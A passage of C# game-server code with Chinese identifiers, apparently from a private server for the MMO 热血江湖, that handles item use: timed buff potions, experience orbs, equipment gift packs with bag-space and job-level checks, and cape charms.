								RxjhClass.开盒记录(base.Userid, base.UserName, base.人物全服ID, openClass2.FLD_PID, openClass2.FLD_NAMEX, openClass2.FLD_MAGIC1, openClass2.FLD_MAGIC2, openClass2.FLD_MAGIC3, openClass2.FLD_MAGIC4, openClass2.FLD_MAGIC5, base.人物坐标_地图, (int)base.人物坐标_X, (int)base.人物坐标_Y, "钥匙");
							}
						}
						else
						{
							使用封印宝箱提示信息(物品类9.物品位置, 44);
						}
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000218:
				case 1008000224:
				case 1008000246:
				case 1008000256:
				case 1008000900:
				{
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					if (GetAddState(1008000097) || GetAddState(1008000096) || GetAddState(1008000095) || GetAddState(1008000321) || GetAddState(1008000322) || GetAddState(1008000323) || GetAddState(1008000324) || GetAddState(1008000362) || GetAddState(1008000363) || (GetAddState(1008000239) ? true : false))
					{
						新吃药提示();
						return;
					}
					int 时间3 = 7200000;
					switch (num49)
					{
					case 1008000224:
					case 1008000256:
						时间3 = 3600000;
						break;
					case 1008000900:
						时间3 = 86400000;
						break;
					}
					Set追加状态物品(1, 时间3, 15, 2);
					Set追加状态物品(2, 时间3, 15, 2);
					Set追加状态物品(3, 时间3, 1000, 1);
					Set追加状态物品(7, 时间3, 10, 2);
					Set追加状态物品(8, 时间3, 10, 2);
					Set追加状态物品(9, 时间3, 40, 2);
					更新武功和状态();
					if (num49 == 1008000256)
					{
						物品减去属性数量(num24, 1);
					}
					else
					{
						物品使用(num13, num24, 1);
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000232:
				{
					if (GetAddState(1008000232))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类69 = new 追加状态类(this, 7200000, num49, 1);
					追加状态列表.Add(追加状态类69.FLD_PID, 追加状态类69);
					base.人物追加最大_HP += 300;
					base.FLD_人物_追加_经验百分比 += 0.1;
					base.FLD_人物_追加_获得游戏币百分比 += 0.4;
					base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
					状态效果(array, 1, 7200000);
					更新人物数据(this);
					更新广播人物数据();
					物品减去属性数量(num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000240:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类64 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类64.FLD_PID, 追加状态类64);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000241:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类62 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类62.FLD_PID, 追加状态类62);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000242:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类60 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类60.FLD_PID, 追加状态类60);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000243:
					if (!追加状态列表.ContainsKey(1008000243))
					{
						追加状态类 追加状态类58 = new 追加状态类(this, 36000000, num49, 1);
						追加状态列表.Add(追加状态类58.FLD_PID, 追加状态类58);
						addFLD_追加百分比_攻击(0.2);
						addFLD_追加百分比_防御(0.2);
						base.人物追加最大_HP += 200;
						base.FLD_人物_追加_经验百分比 += 0.15;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						状态效果(array, 1, 36000000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
						return;
					}
					break;
				case 1008000245:
				{
					if (GetAddState(1008000245))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类59 = new 追加状态类(this, 14400000, num49, 1);
					追加状态列表.Add(追加状态类59.FLD_PID, 追加状态类59);
					base.人物追加最大_HP += 300;
					base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					base.FLD_人物_追加_气功++;
					更新气功();
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
					状态效果(array, 1, 14400000);
					物品减去属性数量(num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000248:
					if (!GetAddState(1008000248))
					{
						追加状态类 追加状态类49 = new 追加状态类(this, 14400000, num49, 1);
						追加状态列表.Add(追加状态类49.FLD_PID, 追加状态类49);
						状态效果(array, 1, 14400000);
						base.FLD_人物_追加_经验百分比 += 1.0;
						base.FLD_人物_追加_获得游戏币百分比 += 1.0;
						base.FLD_人物_追加_物品掉落概率百分比 += 1.0;
						base.FLD_人物_追加_历练百分比 += 1.0;
						物品减去属性数量(num24, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					else
					{
						新吃药提示();
					}
					return;
				case 1008000250:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类48 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类48.FLD_PID, 追加状态类48);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						base.FLD_人物_追加_气功++;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000251:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类46 = new 追加状态类(this, 86400000, num49, 1);
						追加状态列表.Add(追加状态类46.FLD_PID, 追加状态类46);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						base.FLD_人物_追加_气功++;
						状态效果(array, 1, 86400000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000252:
				{
					if (GetAddState(1008000252))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类47 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类47.FLD_PID, 追加状态类47);
					base.FLD_人物_追加_防御++;
					base.人物追加最大_HP++;
					base.FLD_人物_追加_回避++;
					base.FLD_人物_武功防御力增加百分比 += 0.01;
					base.FLD_人物_武功攻击力增加百分比 += 0.2;
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
					状态效果(array, 1, 3600000);
					物品减去属性数量(num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 1008000264:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000265:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000266:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000272:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000273:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000274:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000280:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000281:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008000282:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
						break;
					}
					if (base.Player_Level >= 140)
					{
						系统提示("140级以上的角色无法使用");
						return;
					}
					物品使用(num13, num24, 1);
					base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
					计算人物基本数据3();
					更新经验和历练();
					更新金钱和负重();
					break;
				case 1008000315:
					base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
					物品使用(num13, num24, 1);
					计算人物基本数据3();
					更新经验和历练();
					更新金钱和负重();
					break;
				case 1008000522:
					if (得到包裹空位数() >= 5)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1008000522, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000522, "999药品套餐", num13, num24);
						MainForm.WriteLine(5, "打开999药品套装" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("背包空位不够了。");
					}
					break;
				case 1008000523:
					if (得到包裹空位数() >= 4)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1008000523, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000523, "右三套餐", num13, num24);
						MainForm.WriteLine(5, "打开右三套餐" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("背包空位不够了。");
					}
					break;
				case 1008000524:
					if (得到包裹空位数() >= 17)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1008000524, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000524, "新手10级装备", num13, num24);
						MainForm.WriteLine(5, "打开新手10级装备" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("背包空位不够了。");
					}
					break;
				case 1008000535:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 4)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000535, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000535, "80级防具套", num13, num24);
						MainForm.WriteLine(5, "打开80级过渡套装" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于4转, 背包空位不够了。");
					}
					break;
				case 1008000555:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 4)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000555, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000555, "90级防具套", num13, num24);
						MainForm.WriteLine(5, "打开90级过渡套装" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于4转, 背包空位不够了。");
					}
					break;
				case 1008000554:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 4)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000554, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000554, "100级防具套", num13, num24);
						MainForm.WriteLine(5, "打开100级过渡套装" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于4转, 背包空位不够了。");
					}
					break;
				case 1008000534:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 5)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000534, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000534, "120防具套", num13, num24);
						MainForm.WriteLine(5, "打开120级过渡装" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于5转, 或者背包空位不够了。");
					}
					break;
				case 1008000515:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 8)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000515, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000515, "130级防具套", num13, num24);
						MainForm.WriteLine(5, "打开130防具套" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须8转升天三，或者背包空位不够了。");
					}
					break;
				case 1008000526:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 9)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000526, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000526, "140级防具套", num13, num24);
						MainForm.WriteLine(5, "打开140防具套" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须9转升天四，背包空位不够了。");
					}
					break;
				case 1008000539:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 2)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1008000539, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000539, "150级防具套", num13, num24);
						MainForm.WriteLine(5, "打开150白装套" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须2转, 背包空位不够了。");
					}
					break;
				case 1008000507:
					if (得到包裹空位数() >= 15 && base.Player_Job_leve >= 10)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1502, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000507, "150PVP玉林套", num13, num24);
						MainForm.WriteLine(5, "打开150PVP玉林套" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须10转升天五, 背包空位不够了。");
					}
					break;
				case 1008000508:
					if (得到包裹空位数() >= 7 && base.Player_Job_leve >= 10)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1503, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000508, "150PVP五件套", num13, num24);
						MainForm.WriteLine(5, "打开150PVP五件套" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须10转升天五, 背包空位不够了。");
					}
					break;
				case 1008000531:
					if (得到包裹空位数() >= 2)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1008000531, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000531, "满宝石礼包", num13, num24);
						MainForm.WriteLine(5, "打开满宝石礼包" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("背包空位不够了。");
					}
					break;
				case 1008000532:
					if (得到包裹空位数() >= 18)
					{
						发送套装(base.Player_Job, base.Player_Sex, 1008000532, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000532, "全职业气功书", num13, num24);
						MainForm.WriteLine(5, "打开全职业气功书" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("背包空位不够了。");
					}
					break;
				case 1008000540:
					if (得到包裹空位数() >= 15 && base.Player_Job_leve >= 10)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 1501, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000540, "150PVP绯蓝套", num13, num24);
						MainForm.WriteLine(5, "打开150PVP绯蓝套" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于10转, 背包空位不够了。");
					}
					break;
				case 1008000544:
					if (得到包裹空位数() >= 2 && base.Player_Job_leve >= 10)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 4150, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000544, "150PVP武器", num13, num24);
						MainForm.WriteLine(5, "打开150PVP级武器" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于10转, 背包空位不够了。");
					}
					break;
				case 1008000545:
					if (得到包裹空位数() >= 2 && base.Player_Job_leve >= 10)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 4160, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000545, "150PVP武器", num13, num24);
						MainForm.WriteLine(5, "打开160PVP级武器" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于10转, 背包空位不够了。");
					}
					break;
				case 1008000546:
					if (得到包裹空位数() >= 2 && base.Player_Job_leve >= 10)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 4170, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000546, "170PVP武器", num13, num24);
						MainForm.WriteLine(5, "打开170PVP级武器" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于10转, 背包空位不够了。");
					}
					break;
				case 1008000547:
					if (得到包裹空位数() >= 2 && base.Player_Job_leve >= 10)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 4180, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000547, "180PVP武器", num13, num24);
						MainForm.WriteLine(5, "打开180PVP级武器" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于10转, 背包空位不够了。");
					}
					break;
				case 1008000548:
					if (得到包裹空位数() >= 2 && base.Player_Job_leve >= 10)
					{
						发送套装2(base.Player_Job, base.Player_Sex, 4190, base.Player_Zx, 装备栏包裹[num24].Get物品全局ID, 1008000548, "190PVP武器", num13, num24);
						MainForm.WriteLine(5, "打开190PVP级武器" + base.Userid + "---" + base.UserName);
					}
					else
					{
						系统提示("必须大于10转, 背包空位不够了。");
					}
					break;
				case 1008000304:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类83 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类83.FLD_PID, 追加状态类83);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_追加_防御 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000305:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类82 = new 追加状态类(this, 86400000, num49, 1);
						追加状态列表.Add(追加状态类82.FLD_PID, 追加状态类82);
						base.FLD_人物_追加_经验百分比 += 0.05;
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_追加_防御 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.03;
						状态效果(array, 1, 86400000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000306:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类81 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类81.FLD_PID, 追加状态类81);
						base.FLD_人物_追加_经验百分比 += 0.1;
						base.FLD_人物_追加_攻击 += 40;
						base.FLD_人物_追加_防御 += 40;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000307:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类79 = new 追加状态类(this, 86400000, num49, 1);
						追加状态列表.Add(追加状态类79.FLD_PID, 追加状态类79);
						base.FLD_人物_追加_经验百分比 += 0.1;
						base.FLD_人物_追加_攻击 += 40;
						base.FLD_人物_追加_防御 += 40;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						状态效果(array, 1, 86400000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000310:
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					Set追加状态物品(1, 3600000, 15, 2);
					Set追加状态物品(2, 3600000, 15, 2);
					Set追加状态物品(3, 3600000, 300, 1);
					Set追加状态物品(5, 3600000, 20, 1);
					Set追加状态物品(14, 3600000, 1, 1);
					更新武功和状态();
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				case 1008000325:
				{
					if (妖花青草)
					{
						return;
					}
					妖花青草 = true;
					追加状态类 追加状态类76 = new 追加状态类(this, 7200000, num49, 1);
					追加状态列表.Add(追加状态类76.FLD_PID, 追加状态类76);
					base.FLD_人物_追加_经验百分比 += 0.1;
					base.FLD_人物_追加_攻击 += 40;
					base.FLD_人物_追加_防御 += 40;
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					base.人物追加最大_HP += 300;
					状态效果(array, 1, 7200000);
					物品减去属性数量(num24, 1);
					更新武功和状态();
					更新广播人物数据();
					更新人物数据(this);
					更新装备效果();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000326:
				{
					if (妖花青草)
					{
						return;
					}
					妖花青草 = true;
					追加状态类 追加状态类73 = new 追加状态类(this, 86400000, num49, 1);
					追加状态列表.Add(追加状态类73.FLD_PID, 追加状态类73);
					base.FLD_人物_追加_经验百分比 += 0.1;
					base.FLD_人物_追加_攻击 += 40;
					base.FLD_人物_追加_防御 += 40;
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					base.人物追加最大_HP += 300;
					状态效果(array, 1, 86400000);
					物品减去属性数量(num24, 1);
					更新武功和状态();
					更新广播人物数据();
					更新人物数据(this);
					更新装备效果();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000388:
				{
					if (GetAddState(1008000388))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类72 = new 追加状态类(this, 1800000, num49, 1);
					追加状态列表.Add(追加状态类72.FLD_PID, 追加状态类72);
					状态效果(array, 1, 1800000);
					base.FLD_人物_追加_经验百分比 += 3.0;
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000389:
				{
					if (GetAddState(1008000389))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类71 = new 追加状态类(this, 1800000, num49, 1);
					追加状态列表.Add(追加状态类71.FLD_PID, 追加状态类71);
					状态效果(array, 1, 1800000);
					base.FLD_人物_追加_经验百分比 += 1.5;
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000865:
					物品使用(num13, num24, 0);
					return;
				case 1008000866:
					物品使用(num13, num24, 0);
					return;
				case 1008000867:
				{
					TimeSpan timeSpan = DateTime.Now.AddDays(30.0).Subtract(new DateTime(1970, 1, 1, 8, 0, 0));
					称号药品类 称号药品类3 = new 称号药品类();
					称号药品类3.药品ID = 1008000867;
					称号药品类3.时间 = (uint)timeSpan.TotalSeconds;
					称号药品类 称号药品类4 = 称号药品类3;
					称号药品.TryAdd(称号药品类4.药品ID, 称号药品类4);
					Set武勋物品(称号药品类4);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001022:
				case 1008001023:
				case 1008001024:
				case 1008001025:
				case 1008001134:
				{
					if (装备栏已穿装备[11].Get物品ID == 0)
					{
						系统提示("必须先穿戴披风才能使用", 9, "系统提示");
						break;
					}
					if (追加状态列表.ContainsKey(1008001135))
					{
						系统提示("你已穿戴斗战披风, 无需再吃五行披风符", 9, "系统提示");
						break;
					}
					if (追加状态列表.ContainsKey(1008001134) || 追加状态列表.ContainsKey(1008001022) || 追加状态列表.ContainsKey(1008001023) || 追加状态列表.ContainsKey(1008001024) || 追加状态列表.ContainsKey(1008001025) || 追加状态列表.ContainsKey(1008001026) || 追加状态列表.ContainsKey(1008001027) || 追加状态列表.ContainsKey(1008001028) || 追加状态列表.ContainsKey(1008001029) || (追加状态列表.ContainsKey(1008001030) ? true : false))
					{
						新吃药提示();
						break;
					}
					状态效果(BitConverter.GetBytes(num49), 1, 86400000);
					追加状态类 追加状态类61 = new 追加状态类(this, 86400000, num49, 1);
					追加状态列表.Add(追加状态类61.FLD_PID, 追加状态类61);
					更新武功和状态();
					物品使用(num13, num24, 1);
					计算人物装备数据();
					break;
				}
				case 1008001026:
				case 1008001027:
				case 1008001028:
				case 1008001029:
				case 1008001030:
				{
					if (装备栏已穿装备[11].Get物品ID == 0)
					{
						系统提示("必须先穿戴披风才能使用", 9, "系统提示");
						break;
					}
					if (追加状态列表.ContainsKey(1008001135))
					{
						系统提示("你已穿戴斗战披风, 无需再吃五行披风符", 9, "系统提示");
						break;
					}
					if (追加状态列表.ContainsKey(1008001134) || 追加状态列表.ContainsKey(1008001022) || 追加状态列表.ContainsKey(1008001023) || 追加状态列表.ContainsKey(1008001024) || 追加状态列表.ContainsKey(1008001025) || 追加状态列表.ContainsKey(1008001026) || 追加状态列表.ContainsKey(1008001027) || 追加状态列表.ContainsKey(1008001028) || 追加状态列表.ContainsKey(1008001029) || (追加状态列表.ContainsKey(1008001030) ? true : false))
					{
						新吃药提示();
						break;
					}
					状态效果(BitConverter.GetBytes(num49), 1, 604800000);
					追加状态类 追加状态类45 = new 追加状态类(this, 604800000, num49, 1);
					追加状态列表.Add(追加状态类45.FLD_PID, 追加状态类45);
					更新武功和状态();
					物品使用(num13, num24, 1);
					计算人物装备数据();
					break;
				}
				case 1008001156:
				case 1008001157:
				case 1008001158:
				case 1008001159:
				{
					if (GetAddState(1008001156) || GetAddState(1008001157) || GetAddState(1008001158) || GetAddState(1008001159))
					{
						新吃药提示();
						break;
					}
					追加状态类 追加状态类41 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类41.FLD_PID, 追加状态类41);
					状态效果(array, 1, 3600000);
					药品_追加_首饰_强化 += num49 - 1008001155;
